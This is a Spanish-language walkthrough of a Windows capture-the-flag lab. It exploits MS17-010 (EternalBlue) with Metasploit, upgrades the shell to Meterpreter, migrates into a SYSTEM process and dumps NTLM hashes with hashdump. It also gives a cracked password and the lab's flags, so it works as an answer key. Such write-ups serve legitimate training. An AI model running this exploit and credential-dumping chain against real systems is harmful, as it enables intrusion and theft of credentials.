# Blue

## 🖥️ Sistema

Windows

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Windows explotando la vulnerabilidad **MS17-010 (EternalBlue)**, obtener acceso mediante **Metasploit**, migrar la sesión a **Meterpreter**, extraer credenciales del sistema y recuperar las flags del laboratorio.

---

## 🛠️ Tecnologías trabajadas

- SMB
- MS17-010 (EternalBlue)
- Metasploit
- Meterpreter
- Hashdump
- NTLM
- Windows Privilege Escalation

---

## 🧠 Metodología

La enumeración inicial mostró varios servicios relacionados con **SMB**, un indicador muy habitual en máquinas Windows vulnerables. Antes de realizar cualquier explotación, identifiqué la versión del sistema operativo para comprobar si existían vulnerabilidades conocidas asociadas.

Al detectar que se trataba de **Windows 7**, la hipótesis más probable era la presencia de **MS17-010 (EternalBlue)**. En lugar de buscar credenciales o realizar ataques de fuerza bruta, decidí comprobar directamente esta vulnerabilidad utilizando el módulo correspondiente de Metasploit.

Tras conseguir una shell inicial, el siguiente objetivo fue mejorar la estabilidad de la sesión convirtiéndola en **Meterpreter**, ya que proporciona muchas más capacidades para la post-explotación. Posteriormente migré la sesión a un proceso estable ejecutado por **SYSTEM**, evitando perder el acceso durante la auditoría.

Finalmente aproveché los privilegios obtenidos para extraer los hashes NTLM almacenados en el sistema y localizar las distintas flags distribuidas por la máquina.

Este laboratorio reproduce una de las vulnerabilidades más conocidas de Windows y muestra una cadena completa de explotación desde la enumeración hasta la post-explotación.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo mediante Nmap.

```bash
nmap -sV -sC -p- 10.130.191.150
```

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 135 | MSRPC |
| 139 | NetBIOS |
| 445 | SMB |

La información obtenida identificó el sistema como:

- Windows 7
- Windows NT 6.1

Estas versiones son conocidas por ser vulnerables a **MS17-010 (EternalBlue)** cuando no han sido actualizadas.

---

### 2. Explotación de EternalBlue

Utilicé **Metasploit** para explotar la vulnerabilidad.

Inicié la consola:

```bash
msfconsole
```

Seleccioné el exploit:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Configuré los parámetros principales.

```bash
set RHOSTS 10.130.191.150
set LHOST tun0
```

Finalmente ejecuté el exploit.

```bash
run
```

La explotación se completó correctamente y obtuve una shell sobre la máquina víctima.

---

### 3. Conversión a Meterpreter

Para facilitar la post-explotación convertí la shell obtenida en una sesión Meterpreter.

Seleccioné la sesión existente.

```bash
sessions 1
```

Posteriormente utilicé el módulo:

```bash
use post/multi/manage/shell_to_meterpreter
```

Configuré la sesión correspondiente.

```bash
set SESSION 1
```

Finalmente ejecuté:

```bash
run
```

Tras unos segundos obtuve una nueva sesión **Meterpreter**.

---

### 4. Post-explotación

Accedí a la nueva sesión.

```bash
sessions -i 2
```

Para mejorar la estabilidad migré el proceso hacia uno ejecutado como **NT AUTHORITY\SYSTEM**.

Primero enumeré los procesos.

```bash
ps
```

Entre ellos localicé:

```
spoolsv.exe
```

Migré la sesión.

```bash
migrate 1304
```

A partir de ese momento la sesión quedó asociada a un proceso mucho más estable y con privilegios elevados.

---

### 5. Extracción de credenciales

Con la sesión ya estabilizada extraje los hashes NTLM almacenados en el sistema.

```bash
hashdump
```

Entre los usuarios apareció:

```
jon
```

Hash NTLM:

```
ffb43f0de35be4d9917ac0cc8ad57f8d
```

Tras crackear el hash obtuve la contraseña:

```
alqfna22
```

---

### 6. Obtención de las flags

Con acceso completo al sistema localicé las diferentes flags utilizando las capacidades de búsqueda de Meterpreter.

Primera flag:

```bash
search -f flag1.*
```

Ubicación:

```
C:\flag1.txt
```

Contenido:

```
flag{access_the_machine}
```

Segunda flag:

```
flag{sam_database_elevated_access}
```

Tercera flag:

```
flag{admin_documents_can_be_valuable}
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una explotación clásica de Windows basada en una vulnerabilidad crítica del protocolo SMB.
- Identificar sistemas potencialmente vulnerables a **MS17-010** mediante la versión del sistema operativo.
- Explotar **EternalBlue** utilizando Metasploit.
- Transformar una shell convencional en una sesión **Meterpreter**.
- Migrar sesiones hacia procesos más estables mediante `migrate`.
- Extraer hashes NTLM utilizando `hashdump`.
- Comprender el proceso de crackeo de hashes NTLM.
- Utilizar las funciones de búsqueda de Meterpreter para localizar información sensible.
